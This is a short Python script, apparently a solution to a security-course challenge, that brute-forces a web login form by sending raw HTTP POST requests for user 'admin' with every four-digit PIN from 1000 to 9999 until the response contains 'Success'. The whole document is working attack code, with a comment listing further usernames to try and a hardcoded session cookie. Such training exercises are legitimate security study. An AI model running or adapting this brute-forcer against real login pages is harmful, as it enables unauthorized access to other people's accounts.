import socket

def allSubstrings(s):
	l = len(s)
	return [s[i:j+1] for i in range(l) for j in range(i,l)]

target = 'packtpub.samsclass.info'
#edwards, realityw, julian, admin
users = ['admin']
for un in users:
	for pw in range(1000, 10000):
		s = socket.socket()
		s.settimeout(15)
		s.connect((target, 80))
		req = """POST /http/chal2.php HTTP/1.1
Host: packtpub.samsclass.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://packtpub.samsclass.info/http/chal2.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: {length}
Cookie: __cfduid=db5437c19d607025174f4d8dbe4bfb0c01509262546
Connection: keep-alive
Upgrade-Insecure-Requests: 1

u={un}&p={pw}"""
		length = len(un) + 4 + 5

		req = req.format(length = length, un = un, pw = str(pw).zfill(3))
		s.send(req.encode('utf-8'))
		resb = s.recv(1024)
		res = resb.decode('utf-8')
		print (un, pw)
		#print (res)
		if "Success" in res:
			print("Correct formula:", un, ' & ', pw)
			break
		
		s.close()


